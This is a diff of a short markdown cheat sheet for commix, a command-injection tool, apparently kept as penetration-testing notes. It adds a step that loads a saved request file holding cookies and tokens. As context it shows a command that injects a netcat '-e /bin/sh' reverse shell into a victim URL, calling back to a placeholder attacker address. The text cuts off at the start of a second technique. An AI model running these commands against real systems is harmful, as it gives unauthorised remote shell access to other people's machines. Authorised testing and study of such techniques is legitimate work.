@@ -4,12 +4,16 @@ Commix Reverse Shell
 READ THIS LINK!!
 https://github.com/commixproject/commix/wiki/Reverse-Shells
 
+Load from saved file (contains cookies, tokens, etc
+---------------------------------------------------
+```bash
+commix -r /must/use/full/path/to/file.txt
+```
 Technique 1
 -----------
 ```bash
 commix -u 'http://victim.ip.address/commandexec/example1.php?ip=127.0.0.1' --os-cmd="/bin/nc.traditional -e /bin/sh attacker.ip.adddress 1234"
 ```
-
 Technique 2
 -----------
 On Attacker
